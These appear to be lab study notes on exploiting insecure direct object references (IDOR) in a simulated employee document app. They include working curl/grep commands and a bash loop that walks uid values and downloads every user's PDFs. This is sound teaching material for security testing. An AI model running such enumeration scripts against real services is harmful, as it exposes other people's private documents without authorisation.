# Mass IDOR Enumeration

## General
- IDOR exploitation ranges from **easy** to **challenging**, depending on how the app calculates references and implements access control.
- Progression covered: **basic enumeration → mass data gathering → privilege escalation**.

## Scenario: Employee Manager app
- Simulated login as employee **uid=1** (real-world would require actual login credentials, but the attack logic is the same).
- Clicking **Documents** → redirects to:
  ```
  /documents.php?uid=1
  ```
- Page shows files like:
  ```
  /documents/Invoice_1_09_2021.pdf
  /documents/Report_1_10_2021.pdf
  ```

## Type 1: Static File IDOR
- File names follow a **predictable pattern**: `<Type>_<uid>_<month>_<year>.pdf`.
- Could try fuzzing filenames directly, but this is unreliable — assumes you know all possible file name prefixes (`Invoice`, `Report`, etc.), so it may miss files.

## Type 2: Parameter-based IDOR (the solid one)
- The page sets `uid` via a **GET parameter**: `documents.php?uid=1`.
- If `uid` is used as a **direct reference** with no back-end access control, changing it should expose other users' data.
- Test: change to `?uid=2`.
  - **Page looks the same at first glance** (same layout, link labels "Invoice"/"Report") — easy to wrongly assume nothing changed.
  - **Key lesson:** always inspect actual file links/content, not just the page "look" — file size and source matter.
  - Actual links differ:
    ```
    /documents/Invoice_2_08_2020.pdf
    /documents/Report_2_12_2020.pdf
    ```
  - Confirms: **different employee's documents were returned** → IDOR confirmed.
- Common variant: a `uid_filter` parameter meant to show only one user's docs — can be **changed to another value** or **removed entirely** to show all documents at once.

## Mass Enumeration (Automating the Attack)
Manually testing `uid=3, 4, 5...` doesn't scale for real environments (hundreds/thousands of users). Options:
- **Burp Intruder** or **ZAP Fuzzer**
- A custom **bash script** (shown below)

### Step 1 — Find a unique marker for links
- Inspect HTML (Firefox: Ctrl+Shift+C) to find the link structure:
  ```html
  <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
  <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
  ```

### Step 2 — Extract links with curl + grep
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```
- Better: use a **regex** to isolate just the file paths (`/documents...pdf`):
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
```
Output:
```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

### Step 3 — Loop over UIDs and download everything
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
- Loops `uid=1` to `uid=10`, extracts each user's document links, and downloads them all with `wget`.
- Result: **mass enumeration** of all employees' documents — full exploitation of the IDOR at scale.
- Alternative tools: Burp Intruder, ZAP Fuzzer, or a PowerShell equivalent script.

## Key takeaways
1. **Don't trust visual similarity** — always check actual resource links/content/size when testing IDOR, not just whether the page "looks the same."
2. Predictable **file naming conventions** (static file IDOR) and **direct ID parameters** (`uid=`) are both common IDOR vectors.
3. Filter parameters (`uid_filter`) can sometimes be **manipulated or stripped** to bypass intended restrictions entirely.
4. Once a basic IDOR is confirmed, **automate enumeration** (curl/grep/wget loops, Burp Intruder, ZAP Fuzzer) to assess full impact (mass data exposure) rather than relying on one-off manual tests.
